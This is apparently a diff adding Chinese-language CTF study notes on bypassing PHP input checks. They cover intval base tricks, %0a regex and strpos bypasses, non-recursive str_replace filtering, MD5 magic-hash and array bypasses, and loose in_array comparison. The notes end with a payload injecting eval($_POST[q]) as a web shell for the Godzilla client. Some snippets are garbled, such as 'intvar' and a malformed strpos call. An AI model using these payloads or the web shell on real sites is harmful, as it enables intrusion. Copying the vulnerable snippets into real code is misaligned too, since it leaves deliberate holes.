@@ -1,0 +1,56 @@
+int intval( var,base)
+
+//var指要转换成 integer 的数量值,base指转化所使用的进制 
+Note: 
+如果 base 是 0，通过检测 var 的格式来决定使用的进制： 
+◦ 如果字符串包括了 "0x" (或 "0X") 的前缀，使用 16 进制 (hex)；否则，  
+◦ 如果字符串以 "0" 开始，使用 8 进制(octal)；否则，  
+◦ 将使用 10 进制 (decimal)。 
+
+返回值 
+成功时返回 var 的 integer 值，失败时返回 0。空的 array 返回 0，非空的 array 
+返回 1。 
+
+num[]=aa 绕过正则数字检测
+
+echo intvar('$_GET[num]',0);
+num=4476e123  //这里就跟上面那个单引号的1e10情况一样，此时只看字母前面的
+num=4476.1  //计算int值时，后面有小数点会直接舍去
+num=0x117c  //0x表明是十六进制数，117c是4476的十六进制数
+num=010574  //0表明是八进制数，10574是4476的八进制数
+
+if(preg_match('/^php$/im', $a)){
+ if(preg_match('/^php$/i', $a)){...}}
+%0aphp
+
+intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，
+可以在PHP中不是科学计数法。所以为了绕过前面的==4476我们就可以构造 4476e123 其实不需要是e其他的字母也可以
+
+//7、str_replace无法迭代过滤
+$sql=$_GET['s'];
+$sql=str_replace('select','',$sql);
+echo $sql;
+//?s=sselectelect
+
+echo MD5('QNKCDZO') == MD5('240610708');
+//name[]=1&password[]=2 数组绕过
+存在MD5值相同的不同的两个数
+
+//4、对于strpos()函数，我们可以利用换行进行绕过（%0a）
+$i='666';
+$ii=$_GET['h'];
+if(strpos($ii==$i,"0")){echo $flag;}
+//?h=%0a666
+
+//5、int_array第三个参数安全
+$whitelist = [1,2,3];
+$page=$_GET['i'];
+if (in_array($page, $whitelist)) {echo "yes";}
+//?i=1ex
+
+num=4476.0
+
+在linux下面表示当前目录是 ./ 所以我们的payload： u=./flag.php
+
+?v1=21&v2=eval($_POST[q])?#&v3=;
+哥斯拉连，密码q
